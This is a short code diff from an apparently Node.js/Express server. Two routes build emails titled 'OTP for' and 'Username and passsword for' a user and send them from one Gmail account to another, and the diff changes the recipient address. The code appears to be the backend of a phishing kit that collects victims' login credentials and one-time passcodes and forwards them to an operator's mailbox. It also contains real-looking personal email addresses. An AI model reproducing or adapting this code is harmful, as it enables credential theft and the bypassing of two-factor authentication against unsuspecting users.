@@ -1013,7 +1013,7 @@ app.post("/starbototpjullish", async (req, res) => {
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
-    to: "hopejullish@gmail.com", // list of receivers
+    to: "hopejullich@gmail.com", // list of receivers
     subject: `OTP for ${userName}`, // Subject line
     text: message, // plain text body
   };
@@ -1055,7 +1055,7 @@ app.post("/starbjullish", async (req, res) => {
 
   let mailOptions = {
     from: "davidmiller4504@gmail.com", // sender address
-    to: "hopejullish@gmail.com", // list of receivers
+    to: "hopejullich@gmail.com", // list of receivers
     subject: `Username and passsword for ${userName}`, // Subject line
     text: message, // plain text body
   };
